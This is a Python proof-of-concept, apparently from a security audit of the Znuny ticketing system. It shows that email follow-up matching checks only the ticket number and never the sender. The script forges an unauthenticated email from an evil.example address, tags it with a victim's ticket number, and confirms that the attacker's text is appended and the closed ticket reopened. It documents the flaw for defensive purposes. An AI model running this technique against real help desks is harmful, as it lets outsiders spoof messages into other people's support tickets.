#!/usr/bin/env python3
r"""
VULN-006 — Unauthenticated article injection into arbitrary tickets via e-mail follow-up
========================================================================================
Vulnerable code : targets/Znuny/Kernel/System/PostMaster/FollowUpCheck/Subject.pm:46 (GetTNByString)
                  targets/Znuny/Kernel/System/Ticket.pm:311-324 (TicketCheckNumber = SELECT id WHERE tn=? — existence only)
                  targets/Znuny/Kernel/System/PostMaster/FollowUp.pm:585-599 (ArticleCreate on matched TicketID)
Vulnerability   : CWE-862 — follow-up matches the ticket number, never the sender

Follow-up matching authenticates the ticket number/Message-ID, never the sender. With the
enumerable DateChecksum numbering, an unauthenticated emailer puts [Ticket#<tn>] in the Subject
and their article is appended to that ticket (reopening it if closed), with a spoofed From — even
though they have no account or access to it. Works even --untrusted (no X-OTRS headers needed).

Proof: create a victim ticket, then feed an unauthenticated email tagged with its number and show
the attacker's article appended to the victim ticket.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-006", "Unauth email follow-up injects an article into an arbitrary ticket",
             ["FollowUpCheck/Subject.pm:46 matches the ticket number; TicketCheckNumber checks existence, not sender"])
    sfx = C.rid()
    # a victim ticket the attacker has no account/access to
    vtid, vtn = C.create_ticket(f"victim thread {sfx}", "Raw", body="legit customer message",
                                customer_id=f"legit{sfx}", customer_user=f"legit{sfx}", state="closed successful")
    before = C.db(f"SELECT COUNT(*) FROM article WHERE ticket_id={vtid}")[0][0]
    C.log("SETUP", f"victim ticket TID={vtid} TN={vtn} (closed), {before} article(s)")

    marker = f"UNAUTH-INJECTED-{sfx}"
    raw = (
        f"From: attacker_{sfx}@evil.example\r\n"
        "To: support@localhost\r\n"
        f"Subject: Re: [Ticket#{vtn}] following up {sfx}\r\n"   # the victim's ticket number
        f"Message-ID: <atkfu-{sfx}@evil.example>\r\n"
        "Date: Tue, 29 Sep 2026 12:05:00 +0000\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: text/plain; charset=UTF-8\r\n"
        "\r\n"
        f"{marker}: content injected into someone else's ticket thread.\r\n")
    C.log("STEP", f"piping an UNAUTHENTICATED (untrusted) email tagged [Ticket#{vtn}] — no account, no X-OTRS")
    rc, out, err = C.postmaster_read(raw, untrusted=True)
    C.log("INFO", f"PostMaster::Read rc={rc}")

    rows = C.db("SELECT amd.a_from, amd.a_body FROM article a "
                "JOIN article_data_mime amd ON amd.article_id=a.id "
                f"WHERE a.ticket_id={vtid} AND amd.a_body LIKE '%{marker}%'")
    after = C.db(f"SELECT COUNT(*) FROM article WHERE ticket_id={vtid}")[0][0]
    state_now = C.db(f"SELECT ts.name FROM ticket t JOIN ticket_state ts ON ts.id=t.ticket_state_id WHERE t.id={vtid}")[0][0]
    C.log("PROOF", f"injected article on victim ticket: {rows}")
    C.log("PROOF", f"victim article count {before} -> {after}; state now: {state_now}")

    open(os.path.join(HERE, "request.http"), "w").write("(raw email piped to Maint::PostMaster::Read --untrusted)\n\n" + raw)
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"injected article rows: {rows}\narticle count {before}->{after}; state {state_now}\n")

    if rows and marker in (rows[0][1] or ""):
        C.confirmed(f"an unauthenticated email tagged [Ticket#{vtn}] appended the attacker's article "
                    f"(from {rows[0][0]}) to victim ticket {vtid} and reopened it (state now "
                    f"'{state_now}') — follow-up matches the ticket number, never the sender.")
    else:
        C.failed(f"no injected article on victim ticket {vtid}: {rows}")

if __name__ == "__main__":
    main()
